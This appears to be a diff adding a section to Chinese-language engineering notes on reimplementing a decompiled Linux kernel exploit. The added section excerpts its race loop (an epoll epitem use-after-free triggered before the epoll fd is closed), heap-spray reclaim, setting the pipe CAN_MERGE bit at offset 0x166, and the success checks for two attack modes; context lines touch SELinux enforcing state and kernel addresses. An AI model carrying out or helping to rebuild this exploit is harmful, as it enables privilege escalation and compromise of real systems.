@@ -833,6 +833,65 @@ return (n == 1) ? (c == '1') : ...;   /* '1' = 仍在 enforcing */
 `generation`/`refs`/`depth`/`refcount` 哨兵更直接，也无需新增 profile 字段
 （批次 B 的 4 个哨兵仍可用于诊断，但不再是验收必需）。
 
+### 2.18 RACE 循环：触发顺序、两种成功模式、精确判据
+
+`annotated.c:5535`–`5575`：
+
+```c
+FUN_0023ac20();                                    /* clock_gettime → go_ns */
+log("RACE round=%d delay_us=%u ... generation=0x%016llx depth=%u "
+    "marker_changed=%d chain_hit=%d bit4=%d", ...);
+log("late_refs","decoy_unlink",
+    "round=%d del_rc=%d del_errno=%d close_after_trigger=1", uVar12, iVar14, local_3b0);
+FUN_0022918c(uVar34);                              /* close(epoll_fd) —— 在触发【之后】 */
+if (uVar13 != 0) {                                 /* uVar13 = chain_hit */
+  local_3cc++;                                     /* reclaim_hits++ */
+  if ((param_1 & 1) == 0) {                        /* 模式 A：pipe_flags_candidate */
+    log("RECLAIM_HIT mode=pipe ... can_merge=%u ...", (uint)uVar25 >> 4 & 1);
+    if (bVar7) {                                   /* bit4 命中 */
+      log("FLAGS_CANDIDATE round=%d chain_hit=1 bit4=1", uVar12);
+      log("RESULT PASS pipe_flags_candidate page=0x%016llx fake_count=%d "
+          "generation=0x%016llx reclaim_hits=%d chain_hits=%d bit4_hits=%d",
+          local_468, 0x10, uVar25, local_3cc, local_3c8, local_460);
+      return 0;
+    }
+  } else {                                         /* 模式 B：zero_byte_redirect */
+    if (bVar8) { log("CHAIN_HIT mode=zero round=%d target=0x%016llx", ...); }
+  }
+}
+```
+
+#### 2.18.1 顺序不变量（批次 D 必须遵守）
+
+**`decoy_unlink` 的 `close_after_trigger=1` 是硬约束**：epoll fd 在**触发之后**才
+关闭。若先 close 再触发，被摘除的 epitem 已不在链上，内核不会遍历到投毒项。
+这与 AGENTS.md「同步/解除关联、资源回收之间的既有先后关系不得因重构而改变」一致。
+
+#### 2.18.2 两个成功模式与判据
+
+| 模式 | 选择 | 成功判据 | 日志 |
+|---|---|---|---|
+| `pipe_flags_candidate` | `param_1 & 1 == 0` | `chain_hit == 1` **且** `bit4 == 1` | `FLAGS_CANDIDATE` → `RESULT PASS` |
+| `zero_byte_redirect` | `param_1 & 1 == 1` | `chain_hit == 1` | `CHAIN_HIT` |
+
+`fake_count = 0x10`（16）= §2.11 的 16 项重定向表。
+
+`can_merge` 的**读**在 `*(u8 *)(puVar18 + 0x166)`：即喷入后在回收槽内**偏移
+0x166 处读回并测 bit 4**，而非写入某个猜测偏移。这解开了此前的死结 ——
+不需要知道 CAN_MERGE 的写点，只需要保证**偏移 0x166 的 bit 4 在我们喷的数据里**。
+
+#### 2.18.3 计数器语义确认批次 A 的改名正确
+
+| 参考计数器 | 含义 | 批次 A stub 曾误称 |
+|---|---|---|
+| `reclaim_hits` | `chain_hit && marker 变化`（真回收） | `pipe_fill_hits`（vmsplice 返回 8）❌ |
+| `chain_hits` | 链被命中 | `chain_hits` ✅ |
+| `bit4_hits` | 观测到 bit 4 | `bit4_hits` ✅ |
+
+`RACE` 行同时打印 `generation` 与 `depth` —— 正是批次 B 加入的
+`epitem_gen` / `epitem_depth` 哨兵。**故这 4 个哨兵用于诊断是对的**，
+但如 §2.17.1 所述，验收判据不依赖它们。
+
 ## 3. 真实机制（综合 §2）
 
 1. **取地址**：`direct_map_base` + `selinux_image_off` → `direct_map_alias=0xffffff80027c6960`，
